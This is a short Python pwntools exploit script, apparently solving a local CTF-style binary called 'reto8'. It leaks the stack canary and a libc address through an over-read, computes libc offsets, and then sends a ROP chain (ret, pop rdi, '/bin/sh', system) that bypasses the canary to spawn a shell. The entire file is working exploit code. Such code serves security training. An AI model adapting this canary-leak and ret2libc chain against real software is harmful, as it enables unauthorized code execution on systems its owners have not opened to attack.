#!/usr/bin/env python3
from pwn import *

context.terminal = ["x-terminal-emulator", "-e"]
p = process("./reto8")

# leak canary and libc
# attach(p, "break *0x0000000000401291\ncontinue")
p.sendlineafter(b"length", b"400")
p.sendlineafter(b"input", b"A")
p.recvuntil(b"was:\n")
leak = p.recv(400)
# print(hexdump(leak))
canary = u64(leak[0x28:0x30])
libc_leak = u64(leak[0xe8:0xf0])
libc_base = libc_leak - 0x29E40
print(f"canary: {canary:#x}")
print(f"libc leak: {libc_leak:#x}")
print(f"libc base: {libc_base:#x}")
assert (libc_base & 0xFFF) == 0

# calculate addresses, offsets depend on the libc
system = libc_base + 0x50d70
binsh = libc_base + 0x1d8678
pop_rdi = libc_base + 0x000000000002a3e5

# do rop
payload = b"A"*40
payload += p64(canary)
payload += p64(0) # padding
payload += p64(0x00000000004012b6) # ret for stack alignment
payload += p64(pop_rdi) + p64(binsh)
payload += p64(system)
p.sendlineafter(b"length", b"400")
p.sendlineafter(b"input", payload)

p.interactive()
